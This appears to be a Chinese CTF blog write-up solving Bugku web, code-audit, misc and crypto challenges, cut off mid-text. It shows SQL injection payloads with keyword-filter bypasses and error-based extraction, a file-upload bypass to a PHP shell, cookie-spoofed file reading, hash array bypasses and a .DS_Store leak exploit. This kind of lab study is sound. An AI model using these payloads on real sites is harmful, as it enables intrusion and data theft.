最后打印r.text里的内容。\n我直接运行后由于编码报错。\n在终端输入命令chcp 65001，切换到代码所在目录，python xxx.py，就能够正常返回结果。\n获得flag。\n速度要快  Des:速度要快！！！\n 查看网页源码：\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;br\u0026gt; \u0026#34;我感觉你得快点!!!\u0026#34; \u0026lt;!-- OK, now you have to post the margin what you find --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 用burp抓包试一下。\n抓包后Response里会有flag 的返回值，经过Base64解码后得到一个字符串，提交后显示flag不正确，尝试后发现需要两次Base64解码。再次尝试Request，查看Response，发现flag后的字符串会变化，而我们还需要通过POST传值，写一个python脚本。\nimport requests import base64 url = \u0026#39;\u0026lt;url\u0026gt;\u0026#39; r = requests.Session() headers = r.get(url).headers mid = base64.b64decode(headers[\u0026#39;flag\u0026#39;]) mid = mid.decode() # 将得到的byte类型值转换为字符串类型，不然使用split()函数会导致类型不匹配报错 flag = base64.b64decode(mid.split(\u0026#39;:\u0026#39;)[1]) # 截取冒号之后的内容，冒号后有一个空格，所以跳过冒号之后的一个内容 data = {\u0026#39;margin\u0026#39;: flag} print(r.post(url, data).text) 获得flag。\ncookies欺骗 Des:N/A。\n打开题目看见一大堆字母，猜测是栅栏密码，可是没法解，抓包试一下。\n发现GET请求的是http://xxx.xxx.xxx/index.php?line=\u0026amp;filename=a2V5cy50eHQ=，filename后的字符串经Base64解码后为keys.txt。\n继续观察，发现line并没有赋值，尝试赋值，页面显示空白，查看源码，没有东西。\n下一个思路，尝试用filename访问常见的index.php，先将它进行Base64编码，得到：aW5kZXgucGhw，尝试访问，页面还是显示空白，查看源码，发现有了\u0026lt;php。\n继续尝试给line赋值，line=1时：\nline=2时：\n写个python脚本自动更改line赋值。\nimport requests for i in range(1, 30): url = \u0026#39;\u0026lt;url\u0026gt;/index.php?line={}\u0026amp;filename=aW5kZXgucGhw\u0026#39;.format(i) # 利用format()函数更改line的值 r = requests.get(url) print(r.text) 得到php代码如下：\n\u0026lt;?php error_reporting(0); $file = base64_decode(isset($_GET[\u0026#39;filename\u0026#39;])?$_GET[\u0026#39;filename\u0026#39;]:\u0026#34;\u0026#34;); $line = isset($_GET[\u0026#39;line\u0026#39;])?intval($_GET[\u0026#39;line\u0026#39;]):0; if ($file == \u0026#39;\u0026#39;) header(\u0026#34;location:index.php?line=\u0026amp;filename=a2V5cy50eHQ=\u0026#34;); $file_list = array ( \u0026#39;0\u0026#39; = \u0026#39;keys.txt\u0026#39;, \u0026#39;1\u0026#39; = \u0026#39;index.php\u0026#39;, ); if (isset($_COOKIE[\u0026#39;margin\u0026#39;]) \u0026amp;\u0026amp; $_COOKIE[\u0026#39;margin\u0026#39;] == \u0026#39;margin\u0026#39;) { $file_list[2] = \u0026#39;keys.php\u0026#39;; } if (in_array($file, $file_list)) { $fa = file($file); echo $fa[$line]; } ?\u0026gt;发现有一个keys.php文件，将其加密后通过filaname访问，空白页面，页面源码为空，尝试burp抓包，并把Cookie改为margin=margin，查看Response。\n获得flag。\nnever give up  Des:N/A。\n 页面源码如下：\n\u0026lt;!--1p.html--\u0026gt; never never never give up!!! 尝试访问1p.html页面，但自动跳转到一个论坛，猜测有重定向头，然后直接查看源码：view-source:http://xxx.xxx.xxx.xxx:xxxx/test/1p.html，获得如下源码：\n进行URL解码：\nBase64解码：\n!--%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E--\rURL解码：\n直接访问f4l2a3g.txt。\n获得flag。\nwelcome to bugkuctf 题目已挂。\n过狗一句话 题目已挂。\n字符？正则？  Des:N/A。\n 打开题目获得代码：\n\u0026lt;?php highlight_file(\u0026#39;2.php\u0026#39;); $key = \u0026#39;KEY{****************}\u0026#39;; $IM = preg_match(\u0026#34;/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i\u0026#34;, trim($_GET[\u0026#34;id\u0026#34;]), $match); if ($IM) { die(\u0026#39;key is:\u0026#39;.$key); } ?\u0026gt; . 匹配除 \u0026ldquo;\\n\u0026rdquo; 之外的任何单个字符\n* 匹配它前面的表达式0次或多次，等价于{0,}\n{4,7} 最少匹配 4 次且最多匹配 7 次，结合前面就是匹配 4 到 7 个任意字符\n/ 匹配 / ，这里的 \\ 是为了转义\n[a-z] 匹配所有小写字母\n[:punct:] 匹配任何标点符号\n/i 表示不分大小写\n 构造payload：?id=keykeyaaaaakey:/a/keya:。\n获得flag。\n前女友 题目已挂。\nlogin1 题目已挂。\n你从哪里来  Des:N/A。\n 使用butp抓包后增加Referer为https://www.google.com。\n获得flag。\nmd5 collision  Des:N/A。\n 构造?a，回显：\n搜索常见md5碰撞值，本题使用：?a=s878926199a。\n获得flag。\n程序员本地网站  Des:请从本地访问。\n 利用插件将XFF修改为127.0.0.1.\n刷新。\n获得flag。\n各种绕过  Des:各种绕过哟。\n 打开题目获得源码：\n\u0026lt;?php highlight_file(\u0026#39;flag.php\u0026#39;); $_GET[\u0026#39;id\u0026#39;] = urldecode($_GET[\u0026#39;id\u0026#39;]); $flag = \u0026#39;flag{xxxxxxxxxxxx}\u0026#39;; if (isset($_GET[\u0026#39;uname\u0026#39;]) and isset($_POST[\u0026#39;passwd\u0026#39;])) { if ($_GET[\u0026#39;uname\u0026#39;] == $POST[\u0026#39;passwd\u0026#39;]) print \u0026#39;passwd can not be unmae.\u0026#39;; else if (sha1($_GET[\u0026#39;uname\u0026#39;]) == sha1($_POST[\u0026#39;passwd\u0026#39;]) \u0026amp; ($_GET[\u0026#39;id\u0026#39;] == \u0026#39;margin\u0026#39;)) { die(\u0026#39;Flag:\u0026#39;.$flag); } else print \u0026#39;sorry!\u0026#39;; } ?\u0026gt;分析代码得知，获得flag的条件是uname和passwd不同，且经sha1()函数加密后值相等，id=margin即可获得flag。\n那么我们利用sha1()函数N/A法处理数组的漏洞，首先经过第一处不等判断，在else if里，左边括号假假为真，总括号真真为真。构造payload：?id=margin\u0026amp;uname[]=0，通过hackbar插件POST传参passwd[]=1。\n获得flag。\n细心  Des:想办法变成admin。\n 打开题目后是一个404页面，源码啥也没有，尝试使用御剑扫描后台目录。\n发现robots.txt，访问：\n访问resusl.php：\n根据下面的GET传参提示，以及之前的题目描述，尝试构造?x=admin。\n获得flag。\n求getshell  Des:N/A。\n 是一个上传文件的题目，页面说的很清楚，只允许上传图片格式的文件，先简单写一个php，修改文件后缀为常见图片格式。\n\u0026lt;?php echo[\u0026#39;Hello\u0026#39;] ?\u0026gt;点击提交， 使用burp抓包。\n然后修改Content-Type:multipart/form-data其中字段的任一值为大写，进行绕过，然后将filename改为xxx.php5，之所以为php5是尝试过其他格式后能正确或的flag的类型，点击提交。\n获得flag。\nINSERT INTO注入  Des:不如写个Python吧。\n \u0026lt;?php error_reporting(0); function getIp() { $ip = \u0026#39;\u0026#39;; if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $ip = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } else { $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; } $ip_arr = explode(\u0026#39;,\u0026#39;, $ip); return $ip_arr[0]; } $host = \u0026#34;localhost\u0026#34;; $user = \u0026#34;\u0026#34;; $pass = \u0026#34;\u0026#34;; $db = \u0026#34;\u0026#34;; $connect = mysql_connect($host, $user, $pass) or die(\u0026#34;Unable to connect\u0026#34;); mysql_select_db($db) or die(\u0026#34;Unable to select database\u0026#34;); $ip = getIp(); echo \u0026#39;your ip is:\u0026#39;.$ip; $sql = \u0026#34;insert into client_ip (ip) values (\u0026#39;$ip\u0026#39;)\u0026#34;; mysql_query($sql); ?\u0026gt;打开题目后直接显示IP地址。\n这道题直接贴上完整过程的python代码：\n获得flag。\n这是一个神奇的登录框 题目已挂。\n多次  Des:本题有2个flag。\n 修改URL后的id值，id=2时：\nid=3时：\nid=4时：\nid=5时：\n提示SQL注入了。\n构造?id=1' and 1=1 --+，页面回显：\n将and进行双写：?id=1' anandd 1=1 --+ ，页面回显正常，可使用双写绕过。\n然后利用异或注入检测被过滤字符，语句：?id=1'^(length('union')!=0)--+。\n若页面回显正常，则说明union字段长度为0，被过滤，继续尝试，and、or、select关键字均被过滤。\n接下来我们进行表名的爆破：?id=-1' uunionnion sselectelect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+\n字段爆破：?id=-1' uunionnion sselectelect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name='flag1'--+\n内容爆破：?id=-1' uunionnion sselectelect 1,group_concat(flag1) from flag1--+\n提交后发现并不正确，然后爆破address的内容：?id=-1' uunionnion sselectelect 1,group_concat(address) from flag1--+\n跳转：\n大小写和双写绕过都被过滤了。\n这里使用extrcatvalue()函数进行报错注入。\n爆破库名：?id=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+\n爆破表名：?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='web1002-2'),0x7e))--+\n爆破字段：?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag2'),0x7e))--+\n爆破内容：?id=1' and extractvalue(1,concat(0x7e,(select group_concat(flag2) from flag2),0x7e))--+\n获得flag。\nPHP_encrypt_1  Des:fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=\n \u0026lt;?php function encrypt($data, $key) { $key = md5(\u0026#39;ISCC\u0026#39;); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i = 0; $i \u0026lt; $len; $i++) { if ($x == $klen) { $x = 0; } $char .= $key[$x]; $x += 1; } for ($i = 0; $i \u0026lt; $len; $i++) { $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); } return base64_encode($str); } ?\u0026gt;直接贴上解码php脚本。\n在配置好环境的Linux终端php xxx.php运行。\n获得flag。\n文件包含2 题目已挂。\nflag.php Des:点了login咋没反应，提示：hint。\n御剑扫描后台，N/A有效信息。\n根据提示，GET传参?hint=0，获得代码：\n\u0026lt;?php\rerror_reporting(0);\rinclude_once(\u0026quot;flag.php\u0026quot;);\r$cookie = $_COOKIE['ISecer']; // cookie = 'ISecer'\rif (isset($_GET['hint'])) { // GET传参为hint时，显示此页面\rshow_source(__FILE__);\r}\relseif (unserialize($cookie) === \u0026quot;$KEY\u0026quot;) { // 反序列化后的cookie为KEY的值，回显flag\recho \u0026quot;$flag\u0026quot;;\r}\relse {\r\u0026gt;?\r\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta http-equiv=\u0026quot;Contene-Type\u0026quot; content=\u0026quot;text/html; charset=UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Login\u0026lt;/title\u0026gt;\r\u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;admin.css\u0026quot; type=\u0026quot;text/css\u0026quot;\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;br\u0026gt;\r\u0026lt;div class=\u0026quot;container\u0026quot; align=\u0026quot;center\u0026quot;\u0026gt;\r\u0026lt;form method=\u0026quot;POST\u0026quot; action=\u0026quot;#\u0026quot;\u0026gt;\r\u0026lt;p\u0026gt;\u0026lt;input name=\u0026quot;user\u0026quot; type=\u0026quot;text\u0026quot; placeholder=\u0026quot;Username\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\u0026lt;input name=\u0026quot;password\u0026quot; type=\u0026quot;password\u0026quot; placeholder=\u0026quot;Password\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\u0026lt;input value=\u0026quot;LOGIN\u0026quot; type=\u0026quot;button\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r\u0026lt;?php\r}\r$KEY = 'IScer:www.iscer.com';\r?\u0026gt;\r审计代码得知，变量KEY的值为NULL，测试代码如下：\n\u0026lt;?php print(serialize(\u0026#34;$KEY\u0026#34;)); $KEY=\u0026#39;flag\u0026#39;; ?\u0026gt;s:0:\u0026quot;\u0026quot;;\n使用burp抓包，添加Cookie:ISecer=s:0:\u0026quot;\u0026quot;;：\n点击发送。\n获得flag。\nsql注入2  Des:全都tm过滤了绝望吗？提示： !,!=,=,+,-,^,%\n 这道题用不上sql注入的方法，可以使用DS Store泄露获得flag。\nLinux安装脚本\npython ds_store_exp.py http://xxx.xxx.xxx.xxx:xxxx/web2/.DS_Store\n获得flag。\n孙xx的博客 此题已被玩坏。\nTrim的日记本  Des:不要一次就放弃。\n 页面所有功能都能正常使用。\n御剑扫描后台试试。\n扫出show.php。\n获得flag。\nlogin2 题目已挂。\nlogin3 题目已挂。\n文件上传2 题目已挂。\n江湖魔头 未解。\nlogin4 未解。\nWeb进阶 phpcmsV9  Des:flag在根目录里txt文件里。\n 给出的页面加载不全，查看源码也没啥有用信息。\n看看robots.txt有没有什么信息呢。\n获得flag。\n海洋CMS  Des:flag在根目录某个txt里。\n 题目已挂。\n小明的博客  Des:N/A。\n 题目已挂。\nBugku-cms1  Des:后台可以getshell哟，flag在根目录。\n 一串乱码，源码也没信息。\n御剑扫后台，啥也没有，上网看了下wp，题应该被搞坏了。\nmaccms-苹果cms  Des:N/A。\n 貌似被搞了\u0026hellip;\nBugku-企业管理系统  Des:flag在网站根目录。\n 题目已挂。\nappcms  Des:flag在根目录。\n 题目已挂。\n实战2-注入 bugkucms bugku导航 又是一个博客 Misc 签到题  Des:N/A。\n 关注公众号即可。\n这是一张单纯的图片  Des:key{}。\n 图片没什么，WinHex看看。\n最后一段有Unicode编码。\n隐写  Des:N/A。\n 一张图片，查看属性发现为500×420，WinHex修改高度。\ntelnet  Des:N/A。\n wireshark，搜索flag。\n眼见非实  Des:N/A。\n binwalk发现是zip文件，解压后依次查找flag。\n代码审计 extract变量覆盖  Des:N/A。\n \u0026lt;?php $flag = \u0026#39;xxx\u0026#39;; extract($_GET); if (isset($shiyan)) { $connect = trim(file_get_contents($flag)); if ($shiyan == $content) { echo \u0026#39;flag{xxx}\u0026#39;; } else { echo \u0026#39;Oh.no\u0026#39;; } } ?\u0026gt;简单分析得出，只要使$flag和$shiyan两个变量相等即可，使用置空的方式让其相等，这就是覆盖题目的基本思路。\n构造?flag=\u0026amp;shiyan=。\n获得flag。\n分析 flag被盗  Des:flag被盗，赶紧溯源！\n 给了一个key.pcapng文件，使用记事本打开。\nCtrl+F搜索flag。\n获得flag。\n加密 滴答~滴  Des:-\u0026hellip; -.- -.-. - ..-. \u0026ndash; .. \u0026hellip; -.-.。\n 很简单的Morse加密，解密网站。\n获得flag。\n聪明的小羊  Des:一只小羊翻过了2个栅栏，KYsd3js2E{a2jda}。\n 很明显，栅栏加密，解密网站。\n获得flag。\nok  Des:Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.\n 没看懂这是啥\u0026hellip;再好好想想。\n这是啥，Ook编码\u0026hellip;解码网站。\n获得flag。\n这不是摩斯密码  Des:下载看看吧。\n 这是Brainfuck编码\u0026hellip;解码网站。\n获得flag。\neasy_crypto  Des:0010 0100 01 110 1111011 11 11111 010 000 0 001101 1010 111 100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10 11110 101011 1111101。\n 摩斯加密，上脚本。\n获得flag。\n简单加密  Des:e6Z9i~]8R~U~QHE{RnY{QXg~QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA。\n 这是啥\u0026hellip;\nA的ASCII码值为65，=的ASCII码值为61，最后是两个A，可能是凯撒加密后的Base64编码。\n附上凯撒解密脚本。\n获得字符串a2V5ezY4NzQzMDAwNjUwMTczMjMwZTRhNThlZTE1M2M2OGU4fQ==，Base64解码。\n获得flag。\n散乱的密文  Des:lf5{ag024c483549d7fd@@1}，一张纸条上凌乱的写着2 1 6 5 3 4。\n 试了试栅栏解密的分组数，不对。\n获得flag。\n凯撒部长的奖励  Des:就在8月，超师傅出色地完成了上级的特遣任务，凯撒部长准备给超师傅一份特殊的奖励，兴高采烈的超师傅却只收到一长串莫名的密文，超师傅看到英语字串便满脸黑线，帮他拿到这份价值不菲的奖励吧。 密文：MSW{byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om}。\n 凯撒解密，一位一位尝试，位移20时得出flag。\n获得flag。\n一段Base64  Des:N/A。\n 给了一大段的Base64编码，就不贴上来了。\n解码。\n进行Unescape解码。\n十六进制转文本。\n再进行Unescape。\n十进制转文本。\n\u0003#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x30;\u0026amp;#x32;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x30;\u0026amp;#x38;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x39;\u0026amp;#x37;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x30;\u0026amp;#x33;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x33;\u0026amp;#x37;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x35;\u0026amp;#x35;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x36;\u0026amp;#x36;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x39;\u0026amp;#x39;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x31;\u0026amp;#x36;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x30;\u0026amp;#x32;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x39;\u0026amp;#x35;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x31;\u0026amp;#x36;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x30;\u0026amp;#x32;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x39;\u0026amp;#x39;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x35;\u0026amp;#x30;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x34;\u0026amp;#x38;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x34;\u0026amp;#x39;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x35;\u0026amp;#x35;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x34;\u0026amp;#x39;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x35;\u0026amp;#x35;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x31;\u0026amp;#x33;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x31;\u0026amp;#x39;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x30;\u0026amp;#x31;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x33;\u0026amp;#x37;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x35;\u0026amp;#x35;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x36;\u0026amp;#x38;\u0026amp;#x3b;\rHTML解码。\n\u0026amp;#102;\u0026amp;#108;\u0026amp;#97;\u0026amp;#103;\u0026amp;#37;\u0026amp;#55;\u0026amp;#66;\u0026amp;#99;\u0026amp;#116;\u0026amp;#102;\u0026amp;#95;\u0026amp;#116;\u0026amp;#102;\u0026amp;#99;\u0026amp;#50;\u0026amp;#48;\u0026amp;#49;\u0026amp;#55;\u0026amp;#49;\u0026amp;#55;\u0026amp;#113;\u0026amp;#119;\u0026amp;#101;\u0026amp;#37;\u0026amp;#55;\u0026amp;#68;\rHTML解码。\nflag%7Bctf_tfc201717qwe%7D\r改为正常的flag格式。\n获得flag。\n.!?  Des:N/A。\n 再怎么改，也改不掉对Ook的独特记忆，解码。\n获得flag。\n+[]-  Des:N/A。\n +++++ +++++ [-\u0026gt;++ +++++ +++\u0026lt;] \u0026gt;++.+ +++++ .\u0026lt;+++ [-\u0026gt;-- -\u0026lt;]\u0026gt;- -.+++ +++.\u0026lt;\r++++[ -\u0026gt;+++ +\u0026lt;]\u0026gt;+ +++.\u0026lt; +++++ [-\u0026gt;-- ---\u0026lt;] \u0026gt;.\u0026lt;++ ++[-\u0026gt; ++++\u0026lt; ]\u0026gt;+++ .\u0026lt;+++\r[-\u0026gt;-- -\u0026lt;]\u0026gt;- ----. ++++. \u0026lt;+++[ -\u0026gt;+++ \u0026lt;]\u0026gt;+. \u0026lt;++++ [-\u0026gt;-- --\u0026lt;]\u0026gt; ----- -.\u0026lt;++\r+[-\u0026gt;+ ++\u0026lt;]\u0026gt; ++.-. ----- ---.\u0026lt; +++[- \u0026gt;+++\u0026lt; ]\u0026gt;+++ .---- .\u0026lt;+++ [-\u0026gt;-- -\u0026lt;]\u0026gt;-\r.\u0026lt;+++ +++[- \u0026gt;---- --\u0026lt;]\u0026gt; ----- ----. +.\u0026lt;++ +++++ +[-\u0026gt;+ +++++ ++\u0026lt;]\u0026gt; +++++\r+++++ .\u0026lt;\rOok的兄弟，Brainfuck又来了，上一个网站进行Brainfuck解码。\n获得flag。\n奇怪的密码  Des:突然天上一道雷电，gndk€rlqhmtkwwp}z。\n g n d k的ASCII码值分别为103 110 100 107。\nf l a g的ASCII码值分别为102 108 97 103。\n发现了规律，上python。\ns = \u0026#39;gndk€rlqhmtkwwp}z\u0026#39; i = 0 flag = \u0026#39;\u0026#39; while i \u0026lt; len(s): num = ord(s[i]) - (i + 1) flag += chr(num) i += 1 print(flag) 获得flag。\n托马斯.杰斐逊  Des:N/A。\n 这个之前有做过。\n先根据密钥对各行进行替换。\n然后根据密文，对第一列元素进行排列，对每行元素进行循环。\n唯一读的通顺的就是倒数第六列：XSXSBUGKUADMIN。\n获得flag。\nzip伪加密  Des:N/A。\n 题目给了一个压缩包，打开里面的flag.txt文档需要密码，当然这里说了伪加密。\n先来分析一下ZIP文件的三个组成部分：\n压缩源文件数据区：\r50 4B 03 04：这是头文件标记（0x04034b50）\r14 00：解压文件所需 pkware 版本\r00 00：全局方式位标记（有N/A加密）\r08 00：压缩方式\r5A 7E：最后修改文件时间\rF7 46：最后修改文件日期\r16 B5 80 14：CRC-32校验（1480B516）\r19 00 00 00：压缩后尺寸（25）\r17 00 00 00：未压缩尺寸（23）\r07 00：文件名长度\r00 00：扩展记录长度\r压缩源文件目录区：\r50 4B 01 02：目录中文件文件头标记(0x02014b50)\r3F 00：压缩使用的 pkware 版本\r14 00：解压文件所需 pkware 版本\r00 00：全局方式位标记（有N/A加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）\r08 00：压缩方式\r5A 7E：最后修改文件时间\rF7 46：最后修改文件日期\r16 B5 80 14：CRC-32校验（1480B516）\r19 00 00 00：压缩后尺寸（25）\r17 00 00 00：未压缩尺寸（23）\r07 00：文件名长度\r24 00：扩展字段长度\r00 